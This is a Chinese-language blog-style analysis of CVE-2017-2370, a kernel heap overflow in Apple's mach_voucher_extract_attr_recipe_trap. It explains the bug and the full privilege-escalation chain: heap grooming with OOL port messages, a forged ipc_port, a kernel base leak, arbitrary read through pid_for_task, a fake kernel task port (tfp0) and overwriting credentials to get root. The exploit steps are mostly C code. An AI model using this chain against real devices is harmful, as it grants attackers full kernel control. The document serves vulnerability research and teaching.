# 0x00.前言

这次提权利用的是`mach_voucher_extract_attr_recipe_trap`存在的一个漏洞，而利用方法的核心就是通过`MACH_MSG_OOL_PORTS_DESCRIPTOR`消息。 

关于`mach_msg ool`简单来说当发送一个包含`ool descriptor`的`msg`时，内核会将指定的数据从用户空间复制到内核空间，并且内核会一直保持这部分数据，直到目标 task 处理了消息。同样，当目标进程接收一个包含`ool descriptor`的消息时，内核会将数据从内核空间复制到用户空间（不一定是真正的复制）。因此可以利用这个技术点向内核堆中写入数据或者从内核读取数据。

由于这个漏洞的利用比三叉戟要复杂得多，所以我就一步步的慢慢去剖析了，从漏洞的产生点到一步步的利用，代码可以参考我的[github](https://github.com/Peterpan0927/CVE-2017-2370)

# 0x01.漏洞产生点

在iOS 10和macOS 10.12中添加的新功能中有一个函数叫做`mach_voucher_extract_attr_recipe_trap`，是一个可以在沙盒内调用的`Mach trap`，下面是这个函数的源代码：

```c
kern_return_t
  mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)
  {
    ipc_voucher_t voucher = IV_NULL;
    kern_return_t kr = KERN_SUCCESS;
    mach_msg_type_number_t sz = 0;
	//将recipe_size的地址拷贝到sz中，此时sz存放的就是kalloc_size的值了
    if (copyin(args->recipe_size, (void *)&sz, sizeof(sz)))     <---------- (a)
      return KERN_MEMORY_ERROR;

    if (sz > MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)
      return MIG_ARRAY_TOO_LARGE;

    voucher = convert_port_name_to_voucher(args->voucher_name);
    if (voucher == IV_NULL)
      return MACH_SEND_INVALID_DEST;

    mach_msg_type_number_t __assert_only max_sz = sz;

    if (sz < MACH_VOUCHER_TRAP_STACK_LIMIT) {
      /* keep small recipes on the stack for speed */
      uint8_t krecipe[sz];
      if (copyin(args->recipe, (void *)krecipe, sz)) {
        kr = KERN_MEMORY_ERROR;
        goto done;
      }
      kr = mach_voucher_extract_attr_recipe(voucher, args->key,
                                            (mach_voucher_attr_raw_recipe_t)krecipe, &sz);
      assert(sz <= max_sz);

      if (kr == KERN_SUCCESS && sz > 0)
        kr = copyout(krecipe, (void *)args->recipe, sz);
    } else {
      uint8_t *krecipe = kalloc((vm_size_t)sz);                 <---------- (b)
      if (!krecipe) {
        kr = KERN_RESOURCE_SHORTAGE;
        goto done;
      }

      if (copyin(args->recipe, (void *)krecipe, args->recipe_size)) {         <----------- (c)
        kfree(krecipe, (vm_size_t)sz);
        kr = KERN_MEMORY_ERROR;
        goto done;
      }

      kr = mach_voucher_extract_attr_recipe(voucher, args->key,
                                            (mach_voucher_attr_raw_recipe_t)krecipe, &sz);
      assert(sz <= max_sz);

      if (kr == KERN_SUCCESS && sz > 0)
        kr = copyout(krecipe, (void *)args->recipe, sz);
      kfree(krecipe, (vm_size_t)sz);
    }

    kr = copyout(&sz, args->recipe_size, sizeof(sz));

  done:
    ipc_voucher_release(voucher);
    return kr;
  }
```

1. 通过分析我们可以知道在a点的时候4byte的用户空间指针`args->recipe_size`被写到`sz`中
2. 在b点的时候，如果`sz`的大小在`MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120)`和`MACH_VOUCHER_TRAP_STACK_LIMIT (256)`之间的话，就会按照`sz`的值去分配一个内核堆缓冲区
3. 在c点的时候将用户空间的内存拷贝到刚刚分配的区域，但是传递的拷贝的大小并不是用来分配内核堆的`sz`，而是一个用户空间指针，于是乎就会产生一个堆溢出，我们正是利用这个点进行攻击，并且`copyin`函数有一个特性就是遇到`unmap`的页面就是停止拷贝，这个特性将会在我们的`poc`中得到利用：

![copyin](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-31%20%E4%B8%8A%E5%8D%8811.42.17.png)

# 0x01.利用步骤

1. 首先我们要使堆空间可控，这里我们用到的技术是堆风水，因为在`freelist`随机化之后，我们并不知道重新分配的内存块的位置了。

先需要了解mach msg中对`MACH_MSG_OOL_PORTS_DESCRIPTOR`的处理 ，内核收到复杂消息后发现是`ports descriptor`后会交给(called by `ipc_kmsg_copyin`)`ipc_kmsg_copyin_ool_ports_descriptor`函数读取所有的`port`对象。该函数会调用`kalloc`分配需要的内存(64位下分配的内存是输入的2倍，name的长度是4字节)，然后将有效的`port`由`name`转换成真实的`ipc_port`对象地址保存，对于输入是`MACH_PORT_NULL或者MACH_PORT_DEAD`的`name`，会保持不变。 

```c
/* calculate length of data in bytes, rounding up */
if (os_mul_overflow(count, sizeof(mach_port_t), &ports_length)) { 
	*mr = MACH_SEND_TOO_LARGE; 
	return NULL; 
} 

if (os_mul_overflow(count, sizeof(mach_port_name_t), &names_length)) { 
    *mr = MACH_SEND_TOO_LARGE;
	return NULL; 
} 

if(ports_length == 0){
    return user_desc;
}

data = kalloc(ports_length); // 分配空间 
... 
objects = (ipc_object_t *) data; 

dsc->address = data; 

for ( i = 0; i < count; i++) { 
    mach_port_name_t name = names[i]; 
    ipc_object_t object;
    if (!MACH_PORT_VALID(name)) {
        objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);// IPC_PORT_DEAD continue; 
    } 
...
}
```
所以攻击的时候我们会发送大量的`MACH_PORT_DEAD`，将内存区域填充为`0xFFFFFFFFFFFFFFFF`(`MACH_PORT_DEAD`)，然后触发漏洞，将其中一个`IPC_PORT_DEAD`修改为攻击者布置好的一块内存区域，如果指向的区域是一个合法的`ipc port`结构，那么在接受`OOL PORTS`消息后，就能够在用户空间得到这个`ipc_port`对应的`port name`，进行下一步攻击。 

![堆风水](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-28%20%E4%B8%8B%E5%8D%884.48.43.png)



2. `ipc_object`对象的构造

首先我们已经得到了这个`fake port`，接下来要进行信息泄漏就必须知道内核会根据那些参数来对它进行不同的处理，首先看看`ipc_port`的结构体

```c
struct ipc_port {
	//ipc_object的指针就在前八个字节，是我们溢出攻击的对象
	struct ipc_object ip_object; // port对象的类型 struct ipc_mqueue,ip_messages;
	struct ipc_mqueue ip_messages; //消息队列
	union {
               struct ipc_space *receiver;
               struct ipc_port *destination;
               ipc_port_timestamp_t timestamp;
    }data;
	union {
    	ipc_importance_task_t imp_task;
    	ipc_kobject_t kobject; // port对应的内核对象
    	uintptr_t alias;
	}kdata;
	...
} __attribute__((__packed__));
```

其中有一个port对应的内核对象，而这个`ipc_port`对应的到底是哪种类型的内核对象则是由`ipc_object`的属性来决定了，所以我们其实是针对`ipc_object`进行构造。

```c
fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK; //设置为IKOT_CLOCK对象，并处于激活状态
fakeport->io_lock_data[12] = 0x11;	//设置port锁处于活动状态，防止死锁
```

内核就会将这个`ipc_port`认作是用于`IKOT_CLOCK`对象通信的`port`，接下来的目的就是来泄漏内核基址：

将这个ipc_port伪造为`IKOT_CLOCK`对象，然后将其 kdata.kobject指针设置为一个内核地址。每次修改这个内核地址后，在用户空间调用`clock_sleep_trap`，内核中会调用`port_name_to_clock`得到这个内核地址， 并将其作为clock参数传 递给`clock_sleep_internal`，源码如下:

```c
static kern_return_t clock_sleep_internal( clock_t clock, sleep_type_t sleep_type, mach_timespec_t *sleep_time)
{
    if (clock == CLOCK_NULL)
      return (KERN_INVALID_ARGUMENT);
    if (clock != &clock_list[SYSTEM_CLOCK])
      return (KERN_FAILURE);
...
}
```

从上面的代码中可以看出如果`clock` 的地址不是`clock_list[SYSTEM_CLOCK]`的地址，就会返回`KERN_FAILURE`，否则就会返回其他的地址，那么我们就可以通过返回的参数，去做遍历(不停修改kobject的值)，直到返回`KERN_FAILURE`为止，那么我们就可以拿到`clock_list[SYSTEM_CLOCK]`在内核中的地址了，而这个地址又不在堆上，而是内核中的一个全局变量，处在一个特定的偏移。接下来就是从这个地方开始往前读每一个页面的头部，找到`MH_MAGIC_64`,也就是`0xfeedfacf`。

```c
extern struct clock_ops sysclk_ops, calend_ops;

struct clock clock_list[] = {
    {&sysclk_ops, 0, 0},
    {&calend_ops, 0, 0}
};
```



3. 内核任意地址读

在我们拿到了这个地址之后，就需要将我们的对象转换为`task`类型，并且找到内核的基址，这样就可以算出`kslide`，进行接下来的`tfp0`操作。

```c
//将fake port的类型换成task，因为需要利用pid_for_task这个接口来进行任意地址读
fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
fakeport->io_references = 0xff;
char* faketask = ((char*)fakeport) + 0x1000;
    
*(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
*(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
*(uint64_t*) (faketask + 0x10) = 0xee;
```

拿到`kobject`的地址，跳到页面开头，在`Yalu102`和`Zheng min`的Poc中对于这个操作的先后是不同的，但是这个并不影响，因为`faketask`的地址同样在这个页面上，所以进行一次与操作都会得到页面的起始地址。

```c
uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
leaked_ptr &= ~0x3FFF;
```

然后就写一个死循环去找`MH_MAGIC_64`，然后进行我们的`tfp0`阶段：

```c
while (1) {
        int leaked = 0;
    	*(uint64_t *)(faketask + 0x380) = leaked_ptr -0x10;
        pid_for_task(foundport, &leaked);
        if (leaked == MH_MAGIC_64) {
            printf("found kernel text at 0x%llx\n", leaked_ptr);
            break;
        }
    	//往前一个页面
        leaked_ptr -= 0x4000;
    }
```

只要为什么可以实现任意地址读，这个是因为`pid_for_task`这个函数的值没有做任何的判断，只是将传进来的参数转换成地址做一些加减运算：

```c
kern_return_t pid_for_task(struct pid_for_task_args *args){
	mach_port_t t = args->t;
    ...
    t1 = port_name_to_task(t);
    p = get_bsdtask_info(t1);
    if(p){
        pid = proc_id(p);
        err = KERN_SUCCESS;
    }
    ...
    (void) copyout((char *)&pid, pid_addr, sizeof(int));
    AUDIT_MACH_SYSCALL_EXIT(err);
    return err;
}

//pid_for_task_args
struct pid_for_task_args{
    PAD_ARG(mach_port_name_t t);
    PAD_ARG(user_addr_r pid);
};
```

![pid_for_task](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%882.41.22.png)



4. tfp0

整个的流程就是找到内核的进程链表，遍历找到自己的进程的地址和`pid0`的地址。然后根据内核进程拿到`kernel task`的地址，再从`kernel task`中获取`itk_sself(kernel task's port)`，然后将`kernel task`的信息覆盖我们伪造的`ipc port`的信息，再将`fake port`指向伪造的`kernel task `，把`kernel task`的`bootstrap port`设置为真实的`kernel task`的port，然后就可以通过接口`task_get_special_port`拿到`kernel task`的`port`，从而实现任意地址读写，把我们自己的`proc`权限改写成`root`。

```c
uint64_t kern_task = 0;
kr32(kernproc+0x18, (int32_t*)&kern_task);
kr32(kernproc+0x18+4 , (int32_t*)(((uint64_t)(&kern_task)) + 4));
    
uint64_t itk_kern_sself = 0;
kr32(kern_task+0xe8, (int32_t*)&itk_kern_sself);
kr32(kern_task+0xe8+4 , (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
    
char *faketaskport = malloc(0x1000);
char *ktaskdump = malloc(0x1000);
    
for (int i = 0; i < 0x1000/4; i++) {
    kr32(itk_kern_sself+i*4, (int32_t*)(&faketaskport[i*4]));
}

for (int i = 0; i < 0x1000/4; i++) {
    kr32(kern_task+i*4, (int32_t*)(&ktaskdump[i*4]));
}
 
//dump kernel task port
memcpy(fakeport, faketaskport, 0x1000);
memcpy(faketask, ktaskdump, 0x1000);


*(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
*(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;

*(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;

//get kernel task
task_get_special_port(foundport, 4, &tfp0);
printf("tfp0 = 0x%x\n", tfp0);

fakeport->io_bits = 0;

uint64_t slide;
slide = kernel_base - 0xFFFFFF8000200000;

printf("kernel_base=0x%llx slide=0x%llx header=0x%llx\n",kernel_base, slide,ReadAnywhere64(kernel_base));

//get root
uint64_t cred = ReadAnywhere64(myproc+0xe8);
WriteAnywhere64(cred+0x18,0);
```

![pwn](http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%885.40.37.png)


# 0x02.参考链接

- [ool msg](https://bbs.pediy.com/thread-201121.htm)
- [project zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1004)
- [zheng min](https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.19.eXT850&articleid=781)
- [Yalu102](https://github.com/kpwn/yalu102)
- And thanks for the help of shrek_wzw

